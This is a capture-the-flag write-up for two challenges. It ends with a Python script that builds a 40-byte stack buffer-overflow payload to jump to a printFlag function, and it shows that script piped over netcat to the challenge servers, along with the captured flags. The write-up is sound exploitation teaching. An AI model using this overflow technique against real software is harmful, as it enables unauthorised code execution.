# IMMADEV
```
shaunak@Shaunaks-MacBook-Pro ~ % nc localhost 5151

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{fake_flag}
shaunak@Shaunaks-MacBook-Pro ~ % nc immadeveloper.nitephase.live 61234

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```
# Performative
I opened the binary in IDA. Inside the pseudocode in main I saw this:
```
buffer = byte ptr -20h
...
scanf("%s", buffer)
```
- plain old scanf masquerading like a problematic ex
- classic bof
- the stack layout: 32 bytes for the buffer, then saved RBP (8 bytes), then the return address (8 bytes)
- so i need: 32 + 8 = 40 bytes before i overwrite the return address.
- then i searched for the function which prints the flag. in the Functions list i found: printFlag
- it opens "flag.txt", reads it and prints it. so this was obviously the function i wanted.
- at the top of the function IDA showed: ***printFlag starts at 0x4011E9***
so my plan was:
- overflow the buffer and replace the return address with 0x4011E9.
- this should make the program jump straight into printFlag() when main returns.
i needed a payload like:
```
"A" * 40 + address_of_printFlag
```
but the address needs to be in little endian. i used good ol python for this:
```
import struct, sys

offset = 40
printFlag = 0x4011E9

payload  = b"A" * offset
payload += struct.pack("<Q", printFlag)

sys.stdout.buffer.write(payload)
```
when I piped this into the program locally
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc localhost 5001
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{fake_flag}
shaunak@Shaunaks-MacBook-Pro src %
```
it printed the fake flag from my local flag.txt: ``nite{fake_flag}``
so I just did:
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc performative.nitephase.live 56743
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
shaunak@Shaunaks-MacBook-Pro src %
```
flag: ``nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}``
